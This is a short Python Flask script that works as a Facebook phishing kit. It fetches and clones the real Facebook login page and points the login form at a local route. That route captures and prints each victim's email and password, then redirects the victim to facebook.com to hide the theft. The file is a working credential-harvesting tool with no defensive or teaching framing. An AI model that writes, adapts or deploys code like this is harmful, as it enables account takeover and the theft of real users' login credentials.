
import requests
from flask import Flask, request, redirect, url_for
from bs4 import BeautifulSoup

app = Flask(__name__)

# At first , the method will be 'GET' at root directory
@app.route("/", methods=['GET', 'POST'])
def fb_ka_page():
    url = "https://facebook.com/"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    # Remove script tags from the parsed HTML
    for script in soup(['script', 'noscript']):
        script.decompose()

    # Changing the action attribute
    form = soup.find('form', {'class': '_9vtf'})
    form['action'] = '/login'

    return str(soup)


@app.route('/login',methods=['POST'])
def data():
    if request.method == 'POST':
        entered_email = request.form['email']
        entered_password = request.form['pass']
        print("Entered Email:", entered_email)
        print("Entered Password:", entered_password)

        # Redirect the user to a different website after form submission
        return redirect(url_for('redirect_to_website'))



@app.route("/redirect", methods=['GET'])
def redirect_to_website():
    # Redirect to the desired website
    return redirect("https://facebook.com")


if __name__ == "__main__":
    app.run(debug=True)

# Facebook client side password encryption
# https://hackmd.io/@Ostrym/facebook-client-side-encryption
